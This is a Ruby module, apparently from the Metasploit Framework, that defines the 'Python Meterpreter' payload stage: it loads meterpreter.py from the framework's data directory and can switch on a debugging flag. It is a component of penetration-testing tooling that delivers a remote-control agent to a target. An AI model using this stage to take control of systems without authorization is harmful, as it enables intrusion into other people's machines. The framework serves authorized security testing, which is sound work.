##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_python'
require 'msf/base/sessions/meterpreter_options'

module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Python Meterpreter',
      'Description'    => %q{
        Run a meterpreter server in Python. Supported Python versions
        are 2.5 - 2.7 and 3.1 - 3.4.
      },
      'Author'        => 'Spencer McIntyre',
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Python_Python
    ))
    register_advanced_options([
      OptBool.new('DEBUGGING', [ true, "Enable debugging for the Python meterpreter", false ])
    ], self.class)
  end

  def generate_stage
    file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.py")

    met = File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }

    if datastore['DEBUGGING']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    met
  end
end
